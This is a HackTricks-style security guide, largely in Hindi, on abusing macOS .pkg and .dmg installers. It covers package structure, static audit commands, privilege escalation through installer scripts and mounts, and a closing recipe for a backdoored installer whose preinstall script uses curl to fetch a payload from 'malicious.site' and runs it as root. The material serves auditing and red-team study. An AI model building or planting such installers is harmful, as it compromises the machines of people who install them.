# macOS इंस्टॉलर का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

एक macOS **installer package** (जिसे `.pkg` file भी कहा जाता है) एक file format है जिसका उपयोग macOS **software distribute** करने के लिए करता है। ये files एक **box** की तरह हैं जिसमें वह सब कुछ होता है जो एक piece of software को सही तरीके से install और run करने के लिए चाहिए।

package file खुद एक archive होता है जो **files और directories का hierarchy** रखता है, जिन्हें target computer पर install किया जाएगा। इसमें installation से पहले और बाद में tasks करने के लिए **scripts** भी शामिल हो सकते हैं, जैसे configuration files set up करना या software के पुराने versions को clean up करना।

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) और script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, scripts चलाने के paths
- **Bill of materials (bom)**: install, update या remove होने वाली files की list, file permissions के साथ
- **Payload (CPIO archive gzip compressed)**: `install-location` में install होने वाली files from PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre और post install scripts और execution के लिए temp directory में extract होने वाले more resources।

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
इंस्टॉलर की सामग्री को मैन्युअल रूप से decompress किए बिना visualize करने के लिए आप free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) का भी use कर सकते हैं।

### Static triage shortcuts

अगर goal analysis है, तो पहले **package को `Installer.app` के साथ खोलने से बचने** की कोशिश करें। कुछ packages जैसे ही Installer उन्हें खोलता है, code execute कर सकते हैं (for example via `system.run()` या installer plug-ins), इसलिए offline extraction आमतौर पर safer starting point होता है।
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG मूल जानकारी

DMG files, या Apple Disk Images, एक file format हैं जिन्हें Apple के macOS में disk images के लिए उपयोग किया जाता है। एक DMG file मूल रूप से एक **mountable disk image** होती है (इसमें अपना filesystem होता है) जो raw block data रखती है, जो आमतौर पर compressed होती है और कभी-कभी encrypted भी। जब आप एक DMG file खोलते हैं, macOS उसे **ऐसे mount करता है जैसे वह एक physical disk हो**, जिससे आप उसकी contents access कर सकते हैं।

> [!CAUTION]
> ध्यान दें कि **`.dmg`** installers **इतने सारे formats** support करते हैं कि पहले इनमें से कुछ में vulnerabilities थीं जिनका abuse करके **kernel code execution** प्राप्त की गई थी।

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

एक DMG file की hierarchy उसकी content के आधार पर अलग हो सकती है। हालांकि, application DMGs के लिए, यह आमतौर पर इस structure का पालन करती है:

- Top Level: यह disk image का root होता है। इसमें अक्सर application और संभवतः Applications folder का एक link होता है।
- Application (.app): यह असली application है। macOS में, एक application आमतौर पर एक package होती है जिसमें कई individual files और folders होते हैं जो मिलकर application बनाते हैं।
- Applications Link: यह macOS में Applications folder का shortcut है। इसका उद्देश्य application को install करना आसान बनाना है। आप app install करने के लिए .app file को इस shortcut पर drag कर सकते हैं।

## pkg abuse के जरिए Privesc

### Public directories से execution

यदि कोई pre या post installation script उदाहरण के लिए **`/var/tmp/Installerutil`** से execute हो रही है, और attacker उस script को control कर सकता है, तो वह हर बार उसके execute होने पर privileges escalate कर सकता है। या ऐसा ही एक और example:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

यह एक [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) है जिसे कई installers और updaters **root के रूप में कुछ execute करने** के लिए call करेंगे। यह function **execute** किए जाने वाले **file** का **path** parameter के रूप में accept करता है, हालांकि, यदि कोई attacker इस file को **modify** कर सके, तो वह root के साथ इसके execution का **abuse** करके **privileges escalate** कर सकेगा।
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
अधिक जानकारी के लिए यह talk देखें: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Modern PackageKit bugs ने दिखाया कि installer scripts अक्सर **trusted root code** के रूप में execute होती हैं, जबकि attacker-controlled context पास में ही रहता है। vendor packages का audit करते समय, इन पर खास ध्यान दें:

- Shell interpreters जैसे `#!/bin/zsh` / `#!/bin/bash`
- Calls जैसे `sudo -u $USER`, `launchctl asuser`, या कोई भी logic जो `$USER`, `$HOME`, `PATH`, `TMPDIR`, या relative paths पर trust करती हो
- Non-shell interpreters जो user-controlled init files या libraries load कर सकते हैं
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs) के लिए, [generic macOS privesc page](../macos-privilege-escalation.md) देखें। अगर package **Apple-signed** है, तो वही script bug **SIP/TCC-relevant** बन सकता है क्योंकि `system_installd` `com.apple.rootless.install.heritable` carry कर सकता है; [SIP page](../macos-security-protections/macos-sip.md) देखें।

### Execution by mounting

अगर installer `/tmp/fixedname/bla/bla` में लिखता है, तो `/tmp/fixedname` पर noowners के साथ **mount create** करना संभव है, ताकि आप installation के दौरान **किसी भी file को modify** करके installation process को abuse कर सकें।

इसका एक example **CVE-2021-26089** है, जिसने root के रूप में execution पाने के लिए **periodic script overwrite** किया। अधिक जानकारी के लिए talk देखें: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

सिर्फ **`.pkg`** file generate करना संभव है, जिसमें real payload कुछ भी न हो, बस scripts के अंदर malware के साथ **pre और post-install scripts** हों।

### JS in Distribution xml

package की **distribution xml** file में **`<script>`** tags add करना संभव है और वह code execute होगा, और **`system.run`** का उपयोग करके commands execute कर सकता है:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

distribution packages में यह आमतौर पर top-level `Distribution` file पर depend करता है कि वह external scripts enable करे, जैसे `allow-external-scripts="true"` के साथ। इसलिए सिर्फ `preinstall` / `postinstall` review करना पर्याप्त नहीं है: **Distribution XML** खुद `installation-check` / `volume-check` hooks और direct `system.run()` / `system.runOnce()` execution paths contain कर सकता है।
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### बैकडूर्ड इंस्टॉलर

dist.xml के अंदर script और JS code का उपयोग करने वाला malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - अनपैकिंग Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - अनपैकिंग Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
